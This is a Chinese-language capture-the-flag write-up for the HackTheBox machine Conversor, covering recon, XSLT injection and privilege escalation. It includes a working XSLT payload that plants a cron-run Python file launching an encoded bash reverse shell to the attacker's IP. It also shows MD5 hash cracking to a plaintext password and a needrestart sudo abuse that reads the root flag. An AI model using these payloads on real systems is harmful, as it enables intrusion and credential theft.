{"pageProps":{"postData":{"id":"HackTheBoxSeason9 - Conversor","contentHtml":"<h1>Season9 - Conversor</h1>\n<blockquote>\n<p><a href=\"https://app.hackthebox.com/machines/Conversor\">https://app.hackthebox.com/machines/Conversor</a></p>\n</blockquote>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20Conversor/image.png\" alt=\"image.png\"></p>\n<h2>Recon</h2>\n<h3>PortScan</h3>\n<pre><code class=\"hljs language-python\">➜  Conversor nmap -sT -<span class=\"hljs-built_in\">min</span>-rate <span class=\"hljs-number\">10000</span> -p- <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.92</span>   \nStarting Nmap <span class=\"hljs-number\">7.95</span> ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-<span class=\"hljs-number\">10</span>-<span class=\"hljs-number\">26</span> <span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">51</span> CST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.92</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.052</span>s latency).\nNot shown: <span class=\"hljs-number\">65533</span> closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n<span class=\"hljs-number\">22</span>/tcp <span class=\"hljs-built_in\">open</span>  ssh\n<span class=\"hljs-number\">80</span>/tcp <span class=\"hljs-built_in\">open</span>  http\n\nNmap done: <span class=\"hljs-number\">1</span> IP address (<span class=\"hljs-number\">1</span> host up) scanned <span class=\"hljs-keyword\">in</span> <span class=\"hljs-number\">8.27</span> seconds\n</code></pre>\n<pre><code class=\"hljs language-python\">➜  Conversor nmap -sT -A -p <span class=\"hljs-number\">22</span>,<span class=\"hljs-number\">80</span> <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.92</span>        \nStarting Nmap <span class=\"hljs-number\">7.95</span> ( https://nmap.org ) at <span class=\"hljs-number\">2025</span>-<span class=\"hljs-number\">10</span>-<span class=\"hljs-number\">26</span> <span class=\"hljs-number\">20</span>:<span class=\"hljs-number\">52</span> CST\nNmap scan report <span class=\"hljs-keyword\">for</span> <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.92</span>\nHost <span class=\"hljs-keyword\">is</span> up (<span class=\"hljs-number\">0.055</span>s latency).\n\nPORT   STATE SERVICE VERSION\n<span class=\"hljs-number\">22</span>/tcp <span class=\"hljs-built_in\">open</span>  ssh     OpenSSH <span class=\"hljs-number\">8.9</span>p1 Ubuntu 3ubuntu0<span class=\"hljs-number\">.13</span> (Ubuntu Linux; protocol <span class=\"hljs-number\">2.0</span>)\n| ssh-hostkey: \n|   <span class=\"hljs-number\">256</span> 01:<span class=\"hljs-number\">74</span>:<span class=\"hljs-number\">26</span>:<span class=\"hljs-number\">39</span>:<span class=\"hljs-number\">47</span>:bc:6a:e2:cb:<span class=\"hljs-number\">12</span>:8b:<span class=\"hljs-number\">71</span>:<span class=\"hljs-number\">84</span>:9c:f8:5a (ECDSA)\n|_  <span class=\"hljs-number\">256</span> 3a:<span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">90</span>:dc:<span class=\"hljs-number\">74</span>:d8:e3:c4:<span class=\"hljs-number\">51</span>:<span class=\"hljs-number\">36</span>:e2:08:06:<span class=\"hljs-number\">26</span>:<span class=\"hljs-number\">17</span>:ee (ED25519)\n<span class=\"hljs-number\">80</span>/tcp <span class=\"hljs-built_in\">open</span>  http    Apache httpd <span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.52</span>\n|_http-server-header: Apache/<span class=\"hljs-number\">2.4</span><span class=\"hljs-number\">.52</span> (Ubuntu)\n|_http-title: Did <span class=\"hljs-keyword\">not</span> follow redirect to http://conversor.htb/\nWarning: OSScan results may be unreliable because we could <span class=\"hljs-keyword\">not</span> find at least <span class=\"hljs-number\">1</span> <span class=\"hljs-built_in\">open</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-number\">1</span> closed port\nDevice <span class=\"hljs-built_in\">type</span>: general purpose\nRunning: Linux <span class=\"hljs-number\">4.</span>X|<span class=\"hljs-number\">5.</span>X\nOS CPE: cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">4</span> cpe:/o:linux:linux_kernel:<span class=\"hljs-number\">5</span>\nOS details: Linux <span class=\"hljs-number\">4.15</span> - <span class=\"hljs-number\">5.19</span>\nNetwork Distance: <span class=\"hljs-number\">2</span> hops\nService Info: Host: conversor.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto <span class=\"hljs-number\">1</span>/icmp)\nHOP RTT      ADDRESS\n<span class=\"hljs-number\">1</span>   <span class=\"hljs-number\">51.96</span> ms <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.14</span><span class=\"hljs-number\">.1</span>\n<span class=\"hljs-number\">2</span>   <span class=\"hljs-number\">52.06</span> ms <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.92</span>\n\nOS <span class=\"hljs-keyword\">and</span> Service detection performed. Please report <span class=\"hljs-built_in\">any</span> incorrect results at https://nmap.org/submit/ .\nNmap done: <span class=\"hljs-number\">1</span> IP address (<span class=\"hljs-number\">1</span> host up) scanned <span class=\"hljs-keyword\">in</span> <span class=\"hljs-number\">14.76</span> seconds\n</code></pre>\n<h3>枚举</h3>\n<p>80 端口</p>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20Conversor/image1.png\" alt=\"image.png\"></p>\n<p>随意注册一个用户进行登录，进入后台后，是一个文件转换点</p>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20Conversor/image2.png\" alt=\"image.png\"></p>\n<p>点击下载模板可以下载一个 <code>nmap.xslt</code> 文件</p>\n<p>这是一个 XSLT (Extensible Stylesheet Language Transformations) 样式表文件</p>\n<p>它的核心作用是将 Nmap (网络扫描工具) 生成的原始 XML 格式的扫描结果 转换成一个 美观、易读的 HTML 报告页面</p>\n<p>简而言之，它是一个 Nmap 报告生成器</p>\n<p>尝试一下该网站上的功能，首先通过 nmap 生成 XML 文件</p>\n<pre><code class=\"hljs language-python\">nmap -sT -A -oX test.xml -p <span class=\"hljs-number\">22</span>,<span class=\"hljs-number\">80</span> <span class=\"hljs-number\">10.10</span><span class=\"hljs-number\">.11</span><span class=\"hljs-number\">.92</span>\n</code></pre>\n<p>上传下载模板以及生成XML文件后得到</p>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20Conversor/image3.png\" alt=\"image.png\"></p>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20Conversor/image4.png\" alt=\"image.png\"></p>\n<p>我注意到转换的数据包里面的内容是</p>\n<pre><code class=\"hljs language-python\">------geckoformboundary3e7871c7873ce6edd6adafba839b063a\nContent-Disposition: form-data; name=<span class=\"hljs-string\">\"xml_file\"</span>; filename=<span class=\"hljs-string\">\"test.xml\"</span>\nContent-<span class=\"hljs-type\">Type</span>: text/xml\n\nxxe 内容\n------geckoformboundary3e7871c7873ce6edd6adafba839b063a\nContent-Disposition: form-data; name=<span class=\"hljs-string\">\"xslt_file\"</span>; filename=<span class=\"hljs-string\">\"nmap.xslt\"</span>\nContent-<span class=\"hljs-type\">Type</span>: application/xml\n\nxslt 内容\n</code></pre>\n<p>索性尝试了 XXE ，但是没有收获</p>\n<p>继续寻找其他内容，发现在 about 中能下载源代码…</p>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20Conversor/image5.png\" alt=\"image.png\"></p>\n<h2>XSLT Injection</h2>\n<p>首先会告诉我们每分钟都会执行 <code>scripts</code> 下的 <code>py</code> 文件，估计是要写文件了</p>\n<pre><code class=\"hljs language-python\">If you want to run Python scripts (<span class=\"hljs-keyword\">for</span> example, our server deletes <span class=\"hljs-built_in\">all</span> files older than <span class=\"hljs-number\">60</span> minutes to avoid system overload), you can add the following line to your /etc/crontab.\n\n<span class=\"hljs-string\">\"\"\"\n* * * * * www-data for f in /var/www/conversor.htb/scripts/*.py; do python3 \"$f\"; done\n\"\"\"</span>\n</code></pre>\n<p>在压缩包里面能找到一个 db 文件，但是通过 sqlite 打开后发现两张表，但是都是空的</p>\n<pre><code class=\"hljs language-shell\"><span class=\"hljs-meta prompt_\">sqlite> </span><span class=\"bash\">.table</span>\nfiles  users\n<span class=\"hljs-meta prompt_\">sqlite> </span><span class=\"bash\"><span class=\"hljs-keyword\">select</span> * from <span class=\"hljs-built_in\">users</span>;</span>\n<span class=\"hljs-meta prompt_\">sqlite> </span><span class=\"bash\">SELECT * from files;</span>\n</code></pre>\n<p>随后通过 AI 进行对源码代码审计，发现一个高危漏洞：XSLT 注入与任意文件读取 (LFI)</p>\n<p>位置： <code>/convert</code> 路由</p>\n<p>风险描述：代码使用了 <code>lxml.etree</code> 进行 XML 和 XSLT 文件的解析与转换。</p>\n<pre><code class=\"hljs language-python\">&#x3C;PYTHON>\nparser = etree.XMLParser(resolve_entities=<span class=\"hljs-literal\">False</span>, no_network=<span class=\"hljs-literal\">True</span>, dtd_validation=<span class=\"hljs-literal\">False</span>, load_dtd=<span class=\"hljs-literal\">False</span>)\nxml_tree = etree.parse(xml_path, parser)\nxslt_tree = etree.parse(xslt_path)\ntransform = etree.XSLT(xslt_tree)\nresult_tree = transform(xml_tree)\n</code></pre>\n<p>尽管开发者通过设置 <code>resolve_entities=False</code> 和 <code>no_network=True</code> 成功缓解了经典的XXE (XML 外部实体注入) 漏洞，但这些防护措施只应用于 XML 文档的解析，而没有阻止 XSLT 转换本身可能带来的风险。</p>\n<p>如果攻击者能够上传一个恶意的 XSLT 文件，并且 <code>lxml</code> 库的配置允许，他们可以使用 XSLT 2.0 或更高版本中的 <code>document()</code> 函数来访问本地文件系统。</p>\n<blockquote>\n<p><a href=\"https://book.hacktricks.wiki/en/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations.html\">https://book.hacktricks.wiki/en/pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations.html</a></p>\n</blockquote>\n<p>测试 <code>XSLT</code></p>\n<pre><code class=\"hljs language-python\">&#x3C;?xml version=<span class=\"hljs-string\">\"1.0\"</span> encoding=<span class=\"hljs-string\">\"ISO-8859-1\"</span>?>\n&#x3C;xsl:stylesheet version=<span class=\"hljs-string\">\"1.0\"</span> xmlns:xsl=<span class=\"hljs-string\">\"http://www.w3.org/1999/XSL/Transform\"</span>>\n&#x3C;xsl:template <span class=\"hljs-keyword\">match</span>=<span class=\"hljs-string\">\"/\"</span>>\n Version: &#x3C;xsl:value-of select=<span class=\"hljs-string\">\"system-property('xsl:version')\"</span> />&#x3C;br />\n Vendor: &#x3C;xsl:value-of select=<span class=\"hljs-string\">\"system-property('xsl:vendor')\"</span> />&#x3C;br />\n Vendor URL: &#x3C;xsl:value-of select=<span class=\"hljs-string\">\"system-property('xsl:vendor-url')\"</span> />&#x3C;br />\n&#x3C;/xsl:template>\n&#x3C;/xsl:stylesheet>\n</code></pre>\n<p>还是存在 XSLT 注入的</p>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20Conversor/image6.png\" alt=\"image.png\"></p>\n<p>寻找上传文件的 <code>payload</code> :</p>\n<p>在 <a href=\"https://swisskyrepo.github.io/PayloadsAllTheThings/XSLT%20Injection/#remote-code-execution-with-native-net\">https://swisskyrepo.github.io/PayloadsAllTheThings/XSLT%20Injection/#remote-code-execution-with-native-net</a>      的底下能找到 →      <a href=\"https://x.com/ptswarm/status/1796162911108255974\">https://x.com/ptswarm/status/1796162911108255974</a></p>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20Conversor/image7.png\" alt=\"image.png\"></p>\n<p>我们尝试一下，将 base64 代码换成自己的弹 <code>shell</code> 代码（PS: 注意 py 代码前不能有空格）</p>\n<pre><code class=\"hljs language-python\">&#x3C;?xml version=<span class=\"hljs-string\">\"1.0\"</span> encoding=<span class=\"hljs-string\">\"UTF-8\"</span>?>\n&#x3C;xsl:stylesheet\n    xmlns:xsl=<span class=\"hljs-string\">\"http://www.w3.org/1999/XSL/Transform\"</span>\n    xmlns:ptswarm=<span class=\"hljs-string\">\"http://exslt.org/common\"</span>\n    extension-element-prefixes=<span class=\"hljs-string\">\"ptswarm\"</span>\n    version=<span class=\"hljs-string\">\"1.0\"</span>>\n&#x3C;xsl:template <span class=\"hljs-keyword\">match</span>=<span class=\"hljs-string\">\"/\"</span>>\n\t&#x3C;ptswarm:document href=<span class=\"hljs-string\">\"/var/www/conversor.htb/scripts/comeuiiaa.py\"</span> method=<span class=\"hljs-string\">\"text\"</span>>\n<span class=\"hljs-keyword\">import</span> os;os.system(<span class=\"hljs-string\">'printf L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjExMC82NjY2IDA+JjEn | base64 -d | bash'</span>)\n  &#x3C;/ptswarm:document>\n&#x3C;/xsl:template>\n&#x3C;/xsl:stylesheet>\n</code></pre>\n<p>等待执行，成功反弹</p>\n<p><img src=\"/post-images/HackTheBoxSeason9%20-%20Conversor/image8.png\" alt=\"image.png\"></p>\n<h2>提权 - to fismathac</h2>\n<p>我们拿一下之前是空的 users.db</p>\n<pre><code class=\"hljs language-python\">sqlite> select * <span class=\"hljs-keyword\">from</span> users;\n<span class=\"hljs-number\">1</span>|fismathack|5b5c3ac3a1c897c94caad48e6c71fdec\n<span class=\"hljs-number\">5</span>|saboten|8a0f38c6c4894948f996c9ba93e90d6a\n<span class=\"hljs-number\">6</span>|bmac|d00f5d5217896fb7fd601412cb890830\n<span class=\"hljs-number\">7</span>|wick|9708d66b9338e4ee6f5db99a65f202de\n<span class=\"hljs-number\">8</span>|admin|21232f297a57a5a743894a0e4a801fc3\n<span class=\"hljs-number\">9</span>|paras|08af7c3e82d6b1975d7f16ff1bac9abf\n<span class=\"hljs-number\">10</span>|master|57b50ebc22d544e7ffd797629c4af943\n<span class=\"hljs-number\">11</span>|hacker|cf787ad3ebe79129ba3a149b6b287bf7\n</code></pre>\n<p>刚好家目录中存在 <code>fismathac</code>k 用户</p>\n<p>爆破得到密码 <code>Keepmesafeandwarm</code></p>\n<pre><code class=\"hljs language-python\">➜  Conversor john --wordlist=/usr/share/wordlists/rockyou.txt --<span class=\"hljs-built_in\">format</span>=Raw-MD5 <span class=\"hljs-built_in\">hash</span> \nUsing default <span class=\"hljs-built_in\">input</span> encoding: UTF-<span class=\"hljs-number\">8</span>\nLoaded <span class=\"hljs-number\">1</span> password <span class=\"hljs-built_in\">hash</span> (Raw-MD5 [MD5 <span class=\"hljs-number\">256</span>/<span class=\"hljs-number\">256</span> AVX2 8x3])\nWarning: no OpenMP support <span class=\"hljs-keyword\">for</span> this <span class=\"hljs-built_in\">hash</span> <span class=\"hljs-built_in\">type</span>, consider --fork=<span class=\"hljs-number\">8</span>\nPress <span class=\"hljs-string\">'q'</span> <span class=\"hljs-keyword\">or</span> Ctrl-C to abort, almost <span class=\"hljs-built_in\">any</span> other key <span class=\"hljs-keyword\">for</span> status\nKeepmesafeandwarm (?)     \n1g <span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">00</span>:<span class=\"hljs-number\">00</span>:01 DONE (<span class=\"hljs-number\">2025</span>-<span class=\"hljs-number\">10</span>-<span class=\"hljs-number\">26</span> <span class=\"hljs-number\">23</span>:04) <span class=\"hljs-number\">0.8771</span>g/s 9625Kp/s 9625Kc/s 9625KC/s Keiser01..Kebiti\nUse the <span class=\"hljs-string\">\"--show --format=Raw-MD5\"</span> options to display <span class=\"hljs-built_in\">all</span> of the cracked passwords reliably\nSession completed. \n</code></pre>\n<p>通过 SSH 成功进入系统</p>\n<h2>提权 - to root</h2>\n<p>查看 sudo 权限</p>\n<pre><code class=\"hljs language-python\">fismathack@conversor:~$ sudo -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> fismathack on conversor:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/<span class=\"hljs-built_in\">bin</span>\\:/usr/sbin\\:/usr/<span class=\"hljs-built_in\">bin</span>\\:/sbin\\:/<span class=\"hljs-built_in\">bin</span>\\:/snap/<span class=\"hljs-built_in\">bin</span>, use_pty\n\nUser fismathack may run the following commands on conversor:\n    (ALL : ALL) NOPASSWD: /usr/sbin/needrestart\n</code></pre>\n<p>结束</p>\n<pre><code class=\"hljs language-python\">fismathack@conversor:~$ sudo /usr/sbin/needrestart -c /root/root.txt\nError parsing /root/root.txt: Bareword <span class=\"hljs-string\">\"f3fb5f8b3d841219295e03effbce3058\"</span> <span class=\"hljs-keyword\">not</span> allowed <span class=\"hljs-keyword\">while</span> <span class=\"hljs-string\">\"strict subs\"</span> <span class=\"hljs-keyword\">in</span> use at (<span class=\"hljs-built_in\">eval</span> <span class=\"hljs-number\">14</span>) line <span class=\"hljs-number\">1.</span>\n</code></pre>\n<h2>总结</h2>\n<p>第一次碰到 XSLT 注入这玩意，折腾了小一会</p>","title":"HackTheBox - Season9 - Conversor","date":"2025-10-26","updated":"2025-10-26","tags":["HackTheBox","Linux","XSLT","Needrestart","encrypt"],"categories":"靶机","comments":true,"description":"Season9 Conversor https://app.hackthebox.com/machines/Conversor Recon PortScan 枚举 80 端口 随意注册一个用户进行登录，进入后台后，是一个文件转换点 点击下载模板可以下载一个 nmap.xslt 文件 这是一个 XSL...","isEncrypted":true}},"__N_SSG":true}